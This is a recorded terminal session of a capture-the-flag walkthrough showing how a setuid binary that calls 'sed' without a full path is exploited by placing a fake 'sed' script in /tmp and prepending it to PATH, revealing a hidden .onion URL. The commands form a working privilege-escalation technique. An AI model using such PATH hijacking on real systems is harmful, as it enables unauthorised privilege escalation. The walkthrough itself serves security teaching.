@@ -1,0 +1,130 @@
+Script started on Tue 22 Sep 2015 03:43:51 AM UTC
+[00;31m++++++++++[>+++++++++++>++++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>(( [01;31mBRAINFUCK ME [00;31m ))++++++++++>+++++++++++>+++++++++++>++++++++++>+++++++++++>++++++++++++>+++++>+++++++++++>++++++++++>++++++++++++<<<<<<<<<<<<<<<<<<<-]>--.>---.>--.>+.>------.>-----.>---.>-.>---.>--.>+.>.>+++++.>---.>-----.>----.>.>+.>----.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# this used to be a fairly challenging LD_PRELOAD e[Kvulnerability, but after realizing that soe[Kme [K[K[K[Kt[K[Kthings were turning out buggier than I'd hoped, I put that vuln on the bak[Kckb urner to give ytou [K[K[K[Kou this, much simpler one sinde[K[K[K[K[Kinstead. It's still scu[K[Kusceptible to a [Kn LD_PRELOAD attack, if you can make it work, but I added a [K [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K.[Kk. think of it as the scene[Kic route. here's the sho rtcut:
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mls -la
+total 32
+drwxr-xr-x 2 bdm    bdm    4096 Sep 21 19:40 [0m[01;34m.[0m
+drwxr-x--- 9 ctf    ctf    4096 Jun 11 21:17 [01;34m..[0m
+--ws--s--x 1 adjust adjust 8600 Sep 21 19:22 [37;41madjust[0m
+-rw-r----- 1 adjust adjust  340 Sep 21 19:40 adjust.c
+-rw-r--r-- 1 root   root      9 Sep 21 20:19 hint
+-rw-r--r-- 1 root   root    713 Jun  8 00:16 .we_ltraced_it_for_you
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcat hint
+sed who?
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcat adjust.c
+cat: adjust.c: Permission denied
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m./adjust
+This file contains a darknet url.
+Here is the source code, with the url redacted:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char *url="AAAAAAAA http://XXXXXXXXXXXXXXXXXXXXXXXXXX BBBBBBBB";
+
+main(int argc, char **argv){
+  puts("This file contains a darknet url.");
+  puts("Here is the source code, with the url redacted:\n");
+  system("cat adjust.c | sed s/XXXXXXXXXXXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXX/");  
+  return 0;
+}
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# ready for a disappointingly simple solution?
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# sigh...
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# okay, here goes. it is pretty handy, in the wild, so do [K[K[Kdo keep reading
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# the vulnerability here s[Kconsists in the fact that sed (or cat, for that matter) isn't called with an explicit path, as /in[K[Kbin/sed. It's just "sed"
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# s[Ksed, by the way, is a stream-edito[King programme. here we're using it to substitute a[Kthe url with a bync[K[K[Kunch of XX[Ks. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [ma[K# anyway, when you g[Kenter a command like this, w/o a path, bash looks at your PATH variable to figure out where to find the binary. watc[K[K[K[K[K[K[K[K[K[K[K[K[K[Ke executable. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mwhich sed
+/bin/sed
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mmkdir /tmp/stuff
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mcat >/tmp/stuff<<EOF
+[00;31m| [m#! /bin/bash
+[00;31m| [mcat
+[00;31m| [mEOF
+bash: /tmp/stuff: Is a directory
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m# oops. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mcat >/mtp/[K[K[K[Ktmp/stuff/sed<<EOF
+[00;31m| [m#! /bin/bash
+[00;31m| [mcat
+[00;31m| [m# this is our ned se[K[K[K[K[Kw[Kew sed file. all it will do is pipe whatever [K[K[K[K[K[K[K[K[K[K[K[K[K[Kcat w[Kanything piped to it back to stdout. 
+[00;31m| [mEOF
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mchmod +x /tmp/stuff/sed
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mexport PATH=/tmp/stuff/sted[K[K[Ked:$PATH
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./[K[K# and now, the magic happens.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./adjust 
+This file contains a darknet url.
+Here is the source code, with the url redacted:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char *url="AAAAAAAA http://XXXXXXXXXXXXXXXXXXXXXXXXXX BBBBBBBB";
+
+main(int argc, char **argv){
+  puts("This file contains a darknet url.");
+  puts("Here is the source code, with the url redacted:\n");
+  system("cat adjust.c | sed s/XXXXXXXXXXXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXX/");  
+  return 0;
+}
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mwhich sed
+/bin/sed
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# ah, I see hwere I [K[K[K[K[K[K[K[Kwhere I fucked up. getting a bit drowsy here. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# ah, I see where I fucked up. getting a bit drowsy here. [C[C[C[Cwhich sed[K[C[C[C[C./adjust [C[C[C[C# and now, the magic happens.[C[C[C[Cexport PATH=/tmp/stuff/sed:$PATH[C[C[C[C[9Pchmod +x /tmp/stuff/sed[C[C[C[Cexport PATH=/tmp/stuff/sed:$PATH[1P:$PATH[1P:$PATH[1P:$PATH
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mwhich sed
+/tmp/stuff//sed
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# see, I entered sed a sdire[K[K[K[K[Kdiretory[K[K[K[Kctory in #[K$PATH. don't do that
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# see, I entered sed a directory in $PATH. don't do that[C[C[C[Cwhich sed[K[C[C[C[Cexport PATH=/tmp/stuff/:$PATH[C[C[C[C# ah, I see where I fucked up. getting a bit drowsy here. [C[C[C[Cwhich sed[K[C[C[C[C./adjust 
+This file contains a darknet url.
+Here is the source code, with the url redacted:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+char *url="AAAAAAAA http://infotombjhy7tcrg.onion/u96wj BBBBBBBB";
+
+main(int argc, char **argv){
+  puts("This file contains a darknet url.");
+  puts("Here is the source code, with the url redacted:\n");
+  system("cat adjust.c | sed s/infotomb.*onion.*j/XXXXXXXXXXXXXXXXXXXXXXXXXX/");  
+  return 0;
+}
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# presto. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m# now we just need to go visit that url in a tor browser, and we've got what we're looking for. 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mEOF
+EOF: command not found
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m ADJUST[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mexit
+
+Script done on Tue 22 Sep 2015 03:51:20 AM UTC
